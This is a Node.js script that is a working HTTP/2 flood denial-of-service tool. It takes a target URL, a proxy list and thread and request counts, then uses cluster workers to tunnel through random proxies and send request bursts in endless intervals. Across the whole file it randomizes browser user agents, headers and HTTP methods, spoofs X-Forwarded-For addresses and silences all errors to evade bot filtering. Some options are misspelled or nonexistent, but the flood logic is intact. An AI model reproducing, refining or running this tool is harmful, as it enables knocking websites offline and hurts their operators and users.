const fs = require("fs"),
    tls = require("tls"),
    url = require("url"),
    http = require("http"),
    http2 = require("http2"),
    axios = require("axios"),
    crypto = require("crypto"),
    cluster = require("cluster"),
    random_ua = require("fake-useragent");

const cipherList = [
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES128-SHA256",
        "ECDHE-RSA-AES128-SHA256",
        "ECDHE-ECDSA-AES256-SHA384",
        "ECDHE-RSA-AES256-SHA384",
    ],
    sigals = [
        "ecdsa_secp256r1_sha256",
        "ecdsa_secp384r1_sha384",
        "ecdsa_secp521r1_sha512",
        "rsa_pss_rsae_sha256",
        "rsa_pss_rsae_sha384",
        "rsa_pss_rsae_sha512",
        "rsa_pkcs1_sha256",
        "rsa_pkcs1_sha384",
        "rsa_pkcs1_sha512",
    ],
    agents = [
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPod; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36",
    ],
    accepts = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html, application/xhtml+xml, application/xml;q=0.9, */*;",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
        "text/html, application/xhtml+xml, image/jxr, */*",
        "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
        "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "text/html, application/xhtml+xml",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/plain;q=0.8,image/png,*/*;q=0.5",
    ],
    acceptEnc = [
        "gzip, deflate",
        "gzip, deflate, br",
        "gzip, deflate, sdch",
        "gzip, deflate, sdch, br",
        "gzip",
    ],
    acceptChar = [
        "utf-8, iso-8859-1;q=0.5",
        "iso-8859-1, utf-8, utf-16, *;q=0.1",
        "iso-8859-1",
    ],
    platform = [
        "Windows",
        "Macintosh",
        "Linux",
        "Android",
        "iPhone",
        "iPad",
        "iPod",
    ];

if (process.argv.length < 7 || process.argv.length > 8) {
    console.log(
        "Usage: node index.js <url> <timeout> <proxies> <threads> <rpp>"
    );
    process.exit(1);
}

const options = {
    target: process.argv[2],
    timeout: process.argv[3],
    proxy: fs.readFileSync(process.argv[4], "utf8").trimEnd().split("\n"),
    threads: process.argv[5],
    rpp: process.argv[6],
};

function randomIp() {
    const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(
        Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    return isPrivate(ip) ? randomIp() : ip;
}

function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

function randStr() {
    const chars =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
    let string_length = 10;
    let randomstring = "";
    for (let i = 0; i < string_length; i++) {
        let rnum = Math.floor(Math.random() * chars.length);
        randomstring += chars.substring(rnum, rnum + 1);
    }
    return randomstring;
}

(async () => {
    process
        .on("uncaughtException", function (err) {})
        .on("unhandledRejection", function (err) {})
        .setMaxListeners(Infinity);

    const proxies = options.proxy;
    const threads = options.threads;
    const rpp = options.rpp;
    const timeout = options.timeout;
    const target = options.target;

    if (cluster.isMaster) {
        console.log("Starting cluster with " + threads + " threads");
        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }
    } else {
        console.log("Starting thread " + cluster.worker.id);
        setInterval(() => {
            const proxy =
                proxies[Math.floor(Math.random() * proxies.length)].split(":");
            const parsed = url.parse(target);

            const agent = new http.Agent({
                keepAlive: true,
                keepAliveMsecs: 10000,
                maxSockets: Infinity,
                maxFreeSockets: Infinity,
                timeout: 60000,
                freeSocketTimeout: 30000,
            });

            var h1connection = http.request(
                {
                    host: proxy[0],
                    port: proxy[1],
                    agent: agent,
                    globalAgent: agent,
                    ciphers:
                        cipherList[
                            Math.floor(Math.random() * cipherList.length)
                        ],
                    method: "CONNECT",
                    path: parsed.host + ":443",
                },
                function () {
                    h1connection.setSocketKeepAlive(true);
                }
            );

            h1connection.on("connect", (_, socket) => {
                const http2session = http2.connect(parsed.href, {
                    createConnection: () => {
                        return tls.connect({
                            host: parsed.host,
                            ciphers:
                                cipherList[
                                    Math.floor(
                                        Math.random() * cipherList.length
                                    )
                                ],
                            sigalgs: sigals.join(":"),
                            agent: agent,
                            servername: parsed.host,
                            rejectUnauthorized: false,
                            secureContext: tls.createSecureContext({
                                secureProtocol: "TLS_method",
                            }),
                            minVersion: "TLSv1.3",
                            maxVersion: "TLSv1.3",
                            secureOptions:
                                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                                crypto.constants.SSL_OP_NO_TICKET |
                                crypto.constants.SSL_OP_NO_SSLv2 |
                                crypto.constants.SSL_OP_NO_SSLv3 |
                                crypto.constants.SSL_OP_NO_COMPRESSION |
                                crypto.constants.SSL_OP_NO_RENEGOTIATION |
                                crypto.constants
                                    .SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                                crypto.constants.SSL_OP_TLSEXT_PADDING |
                                crypto.constants.SSL_OP_ALL |
                                crypto.constants.SSLcom,
                            port: 443,
                            maxRedirects: 100,
                            followAllRedirects: true,
                            gzip: true,
                            decodeEmails: false,
                            honorCipherOrder: true,
                            echdCurve: "GREASE:X25519:x25519",
                            secure: true,
                            rejectUnauthorized: false,
                            requestCert: true,
                            ALPNProtocols: ["h2"],
                            sessionTimeout: 10000,
                            socket: socket,
                        });
                    },
                });

                http2session.on("connect", (_, tlsSocket) => {
                    for (let i = 0; i < rpp; i++) {
                        tlsSocket.setNoDelay(true);
                        tlsSocket.setKeepAlive(true, 10000);
                        tlsSocket.setTimeout(10000);
                        tlsSocket.setEncoding("utf8");

                        const http2request = http2session.request({
                            ":authority": parsed.host,
                            ":method": [
                                "GET",
                                "POST",
                                "HEAD",
                                "OPTIONS",
                                "PUT",
                                "DELETE",
                            ][Math.floor(Math.random() * 6)],
                            ":path": parsed.path,
                            ":scheme": "https",

                            accepts:
                                accepts[
                                    Math.floor(Math.random() * accepts.length)
                                ],
                            "accept-language": "en-US,en;q=0.5",
                            "accept-encoding":
                                acceptEnc[
                                    Math.floor(Math.random() * acceptEnc.length)
                                ],
                            "accept-charset":
                                acceptChar[
                                    Math.floor(
                                        Math.random() * acceptChar.length
                                    )
                                ],
                            "cache-control": "max-age=0",
                            referer: target,
                            "sec-ch-ua":
                                '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform":
                                platform[
                                    Math.floor(Math.random() * platform.length)
                                ],
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "same-origin",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "user-agent":
                                agents[
                                    Math.floor(Math.random() * agents.length)
                                ],
                            "x-forwarded-for": randomIp(),
                        });

                        http2request.on("response", (headers) => {
                            http2request.close();
                            delete headers;
                            delete http2request;
                            return;
                        });

                        http2request.end();
                    }
                });
            });

            h1connection.end();
        });
    }
})();
